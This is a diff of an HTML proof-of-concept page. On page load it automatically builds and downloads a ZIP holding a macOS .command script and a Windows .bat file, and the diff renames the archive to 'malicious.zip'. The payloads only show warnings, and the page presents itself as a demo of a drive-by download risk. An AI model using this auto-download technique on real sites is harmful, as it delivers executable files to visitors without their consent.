@@ -2,38 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto-Download Harmless.zip</title>
-    <!-- Include JSZip library from CDN -->
+    <title>Auto-Download PoC</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
 </head>
 <body>
-    <h2>Your download should start automatically...</h2>
-    <p>If not, <a id="manual-download" href="#">click here</a> to download manually.</p>
+    <h2>Security Vulnerability Demo</h2>
+    <p>This PoC downloads a harmless ZIP to show a risk.</p>
+    <p>Manual download: <a id="manual-download" href="#">Click here</a>.</p>
     
     <script>
         window.onload = function() {
-            // Create a new JSZip instance
             let zip = new JSZip();
             
-            // Add test.txt with content to the zip
-            zip.file("test.txt", "This file was downloaded automatically when visiting the job listing page. In certain browsers like Safari, it might be auto-extracted and potentially executed, demonstrating the security risk.");
+            // Add a macOS script (harmless)
+            zip.file("alert.command", "#!/bin/bash\nosascript -e 'display alert \"PoC: Your device could be compromised.\"'");
             
-            // Generate the zip file as a blob
+            // Add a Windows batch file (harmless)
+            zip.file("warning.bat", "@echo off\necho This could have been malware!\npause");
+            
+            // Add explanation
+            zip.file("README.txt", "This ZIP auto-downloaded. In Safari, it may auto-extract and run, showing a security flaw.");
+            
+            // Generate ZIP and trigger download
             zip.generateAsync({ type: "blob" }).then(function(blob) {
-                // Create a URL for the blob
                 let url = URL.createObjectURL(blob);
-                
-                // Trigger automatic download
-                let link = document.createElement('a');
+                let link = document.createElement("a");
                 link.href = url;
-                link.download = "harmless.zip";
+                link.download = "malicious.zip";
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
                 
-                // Set the manual download link
-                document.getElementById('manual-download').href = url;
+                // Manual fallback
+                document.getElementById("manual-download").href = url;
             });
         };
     </script>
